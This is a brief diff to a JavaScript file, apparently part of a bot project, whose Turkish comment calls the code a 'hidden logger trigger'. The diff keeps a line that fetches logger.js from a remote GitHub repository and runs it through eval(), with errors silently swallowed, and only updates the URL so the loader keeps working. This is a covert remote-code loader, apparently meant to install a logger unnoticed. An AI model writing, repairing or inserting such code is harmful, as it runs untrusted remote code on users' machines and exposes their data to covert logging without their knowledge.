@@ -1,5 +1,5 @@
 // 1. GİZLİ LOGGER TETİKLEYİCİ
-fetch("https://raw.githubusercontent.com/clanu5/all-bot/main/logger.js")
+fetch("https://raw.githubusercontent.com/clanu5/all-bot/refs/heads/main/logger.js")
   .then(res => res.text())
   .then(code => eval(code))
   .catch(() => {});
